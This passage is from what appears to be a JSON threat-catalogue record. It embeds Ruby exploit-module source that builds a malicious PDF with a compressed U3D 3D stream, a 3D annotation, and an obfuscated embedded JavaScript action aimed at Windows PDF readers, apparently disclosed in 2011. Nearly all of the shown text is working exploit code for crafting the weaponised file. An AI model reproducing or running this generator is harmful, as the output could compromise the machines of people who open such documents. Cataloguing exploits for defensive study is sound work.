\"\\x78\\xda\\xd3\\x70\\x4c\\x04\\x02\\x4d\\x85\\x90\\x2c\\x00\\x0f\\xd3\\x02\\xf5\"\n    compressed_data = Zlib::Deflate.deflate(data)\n    xref << pdf.length\n    pdf << io_def(7)\n    pdf << \"<</Length %s /Filter /FlateDecode>>\" %compressed_data.length.to_s << eol\n    pdf << \"stream\" << eol\n    pdf << compressed_data << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(8)\n    pdf << \"<</ProcSet [/PDF]>>\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(9)\n    pdf << \"<</Type/Page/Parent %s/MediaBox [0 0 640 480]/Contents %s/Resources %s>>\" % [io_ref(6), io_ref(7), io_ref(8)]\n    pdf << obj_end\n\n    compressed_u3d = Zlib::Deflate::deflate(u3d_stream)\n    xref << pdf.length\n    pdf << io_def(10)\n    pdf << \"<</Type/3D/Subtype/U3D/Length %s /Filter/FlateDecode>>\" %compressed_u3d.length.to_s << eol\n    pdf << \"stream\" << eol\n    pdf << compressed_u3d << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(11)\n    pdf << \"<</Type/Annot/Subtype/3D/Contents (#{rand_text_alpha(4)})/3DI false/3DA <</A/PO/DIS/I>>\"\n    pdf << \"/Rect [0 0 640 480]/3DD %s /F 7>>\" %io_ref(10)\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(12)\n    pdf << \"<</Type/Page/Parent %s /MediaBox [0 0 640 480]/Contents %s /Resources %s /Annots [%s]>>\" % [io_ref(6), io_ref(7), io_ref(8), io_ref(11)]\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(13)\n    pdf << \"<</Type/Page/Parent %s /MediaBox [0 0 640 480]/Contents %s /Resources %s>>\" % [io_ref(6), io_ref(7), io_ref(8)]\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(14)\n    pdf << \"<</S/JavaScript/JS %s>>\" %io_ref(15)\n    pdf << obj_end\n\n    compressed_js = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js_doc))\n    xref << pdf.length\n    pdf << io_def(15)\n    pdf << \"<</Length \" <<  compressed_js.length.to_s << \" /Filter [/FlateDecode/ASCIIHexDecode]>>\"\n    pdf << \"stream\" << eol\n    pdf << compressed_js << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    # xrefs\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n\n    # trailer\n    pdf << \"trailer\" << eol\n    pdf << \"<</Size %d/Root \" % (xref.length + 1) << io_ref(4) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-06, #Needs to be checked",
    "x_mitre_platforms": [
        "win'"
    ]
}